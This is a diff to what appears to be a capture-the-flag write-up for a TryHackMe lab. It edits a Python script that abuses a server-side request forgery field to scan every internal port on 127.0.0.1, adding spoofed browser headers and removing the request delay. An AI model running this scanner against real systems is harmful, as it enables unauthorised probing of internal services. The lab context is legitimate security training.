@@ -98,20 +98,32 @@ import requests
 import time
 
 url = "http://beta.creative.thm"
+headers = {
+    "Host": "beta.creative.thm",
+    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": "http://beta.creative.thm",
+    "Connection": "close",
+    "Referer": "http://beta.creative.thm/",
+    "Upgrade-Insecure-Requests": "1"
+}
 
 data_template = "url=http%3A%2F%2F127.0.0.1%3A{}"
 
 def send_post_request(port):
     data = data_template.format(port)
     try:
-        response = requests.post(url, data=data, timeout=5)
+        response = requests.post(url, headers=headers, data=data, timeout=5)
         print(f"Port {port}: Status Code {response.status_code}")
     except requests.exceptions.RequestException as e:
         print(f"Port {port}: Request failed ({e})")
 
 for port in range(1, 65536):
     send_post_request(port)
-    time.sleep(0.1)  # >102;O5< =51>;LHCN 7045@6:C <564C 70?@>A0<8
+
 ```
 Option 2:
 Check most common ports
